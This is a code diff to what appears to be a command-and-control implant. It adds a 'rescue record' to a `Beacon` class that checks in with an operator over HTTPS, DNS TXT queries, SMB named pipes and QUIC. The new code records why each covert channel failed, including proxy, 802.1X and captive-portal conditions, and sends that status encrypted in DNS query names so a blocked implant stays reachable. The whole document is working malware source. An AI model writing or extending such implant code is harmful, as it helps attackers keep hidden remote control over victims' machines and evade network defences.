@@ -1644,6 +1644,57 @@ def _dns_query(name: str, qtype: str, server: str, timeout: float = 10) -> list:
 # one mapping, both missing the same half, is how that survived.
 _FALLBACK_TRANSPORTS = ("https", "dns", "smb", "quic")
 
+# ── The rescue record, copied from software/c2/dns_rescue.py ──
+#
+# A copy and not an import, because the generator serves this file to a
+# target as source text: an import of `software.c2.dns_rescue` would not
+# resolve there, and `relay.py`'s comment on `_PAYLOAD_FIELDS` records the
+# same constraint from the listener's side. The copy is the price; a test
+# in test_dns_rescue compares the two and fails when they drift.
+_RESCUE_VERSION = 1
+_RESCUE_MARKER = "r"
+_RESCUE_TRANSPORTS = ("https", "dns", "smb", "quic")
+_RESCUE_CLASSES = {
+    "not_attempted": 0,
+    "answered": 1,
+    "unreachable": 2,
+    "refused": 3,
+    "timed_out": 4,
+    "tls_failed": 5,
+    "http_status": 6,
+    "auth_required": 7,
+    "bad_payload": 8,
+    "resolve_failed": 9,
+}
+_RESCUE_FLAG_PROXY_FOUND = 0x01
+_RESCUE_FLAG_DOT1X_SEEN = 0x02
+_RESCUE_FLAG_PORTAL_ANSWERED = 0x04
+_RESCUE_FLAG_DNS_ANSWERED = 0x08
+# version + (class, code-as-two-bytes) per transport + flags. Two bytes for
+# the code because 407 -- a proxy demanding authentication -- does not fit
+# in one, and nor does any three-digit status above 255.
+_RESCUE_STRUCT = struct.Struct("!BBHBHBHBHB")
+
+
+def _rescue_class_of(exc: BaseException) -> int:
+    """Which failure class an exception belongs to.
+
+    By type and never by message: a message can carry a hostname or a URL,
+    and this value is about to be encrypted into a DNS query name that
+    every resolver on the path can see the length of.
+    """
+    if isinstance(exc, ssl.SSLError):
+        return _RESCUE_CLASSES["tls_failed"]
+    if isinstance(exc, ConnectionRefusedError):
+        return _RESCUE_CLASSES["refused"]
+    if isinstance(exc, (socket.timeout, TimeoutError)):
+        return _RESCUE_CLASSES["timed_out"]
+    if isinstance(exc, (ValueError, KeyError, TypeError)):
+        # A reply arrived and could not be read: a captive portal's HTML
+        # where JSON was expected, or a record that did not decrypt.
+        return _RESCUE_CLASSES["bad_payload"]
+    return _RESCUE_CLASSES["unreachable"]
+
 
 def tunnel_config_from_yaml(c2_cfg: dict, env=None) -> Optional[dict]:
     """Build the endpoint's `tunnel` block from `c2.tunnel`, or None.
@@ -4081,6 +4132,12 @@ class Beacon:
         self._thread: Optional[threading.Thread] = None
         self._registered = False
         self._consecutive_failures = 0
+        # Why each leg produced nothing this cycle: transport -> (class,
+        # code). Every _beacon_* method already computes this and writes it
+        # to a debug log; keeping it is what lets a stuck beacon explain
+        # itself over the one channel it has left.
+        self._leg_status = {}            # type: Dict[str, Tuple[int, int]]
+        self._rescue_flags = 0
 
         # The tunnel endpoint runs in its own process, not a thread: the
         # beacon is the access and the tunnel is the convenience, so a
@@ -4503,8 +4560,17 @@ class Beacon:
                 return result if result else {}
             if resp.status_code == 407:
                 logger.warning("Proxy auth required (407) — set proxy credentials in URL")
+                self._record_leg("https", _RESCUE_CLASSES["auth_required"],
+                                 407)
+            elif resp.status_code != 200:
+                self._record_leg("https", _RESCUE_CLASSES["http_status"],
+                                 resp.status_code)
         except _ProxyError as e:
             logger.debug("Proxy error on %s: %s — retrying direct", endpoint, e)
+            # A proxy that exists and refused us is a different situation
+            # from no proxy at all, and the operator needs to know which.
+            self._rescue_flags |= _RESCUE_FLAG_PROXY_FOUND
+            self._record_leg("https", _RESCUE_CLASSES["auth_required"], 0)
             try:
                 direct = _HttpSession()
                 direct.trust_env = False
@@ -4522,6 +4588,7 @@ class Beacon:
                 pass
         except Exception as e:
             logger.debug("HTTPS %s failed: %s", endpoint, e)
+            self._record_leg("https", _rescue_class_of(e))
         return None
 
     def _register_https(self) -> bool:
@@ -4534,6 +4601,31 @@ class Beacon:
             logger.info("Registered as %s", self._agent_id)
             return True
         return False
+
+    def _start_cycle(self):
+        """Clear what the last cycle learned.
+
+        A failure from three cycles ago riding along in a rescue would make
+        an operator read a stale reason as a current one, which is worse
+        than no reason at all.
+        """
+        self._leg_status = {}
+        self._rescue_flags = 0
+
+    def _record_leg(self, transport: str, klass: int, code: int = 0):
+        """Keep why one leg produced nothing. Never raises.
+
+        Called from the four transport methods beside the debug log they
+        already write. It clamps rather than validates: this sits on the
+        failure path of every check-in, and a beacon that crashed while
+        recording why it could not reach anywhere would be the worst
+        possible trade.
+        """
+        try:
+            self._leg_status[transport] = (int(klass), max(0, min(int(code),
+                                                                  0xFFFF)))
+        except Exception:
+            pass
 
     def _beacon_https(self) -> Optional[dict]:
         info = self._system_info()
@@ -4562,6 +4654,12 @@ class Beacon:
             query = f"{encoded_id}.b.{self.dns_domain}"
 
             results = _dns_query(query, "TXT", self.dns_resolver, timeout=10)
+            # The resolver answered. Whether it carried tasking is a
+            # separate question, and conflating the two is what makes a
+            # DNS-only beacon unexplainable: `None` from here would
+            # otherwise mean both "no route out" and "nothing queued".
+            self._rescue_flags |= _RESCUE_FLAG_DNS_ANSWERED
+            self._record_leg("dns", _RESCUE_CLASSES["answered"])
             for txt in results:
                 try:
                     return self._decrypt(txt)
@@ -4573,6 +4671,7 @@ class Beacon:
                     continue
         except Exception as e:
             logger.debug("DNS beacon failed: %s", e)
+            self._record_leg("dns", _RESCUE_CLASSES["resolve_failed"])
         return None
 
     # ── SMB named-pipe transport ──
@@ -4802,6 +4901,7 @@ class Beacon:
         """Exchange C2 data over SMB named pipe."""
         sock = self._smb_connect()
         if not sock:
+            self._record_leg("smb", _RESCUE_CLASSES["unreachable"])
             return None
         try:
             # No decoy envelope here. _wrap_payload exists to make an HTTP
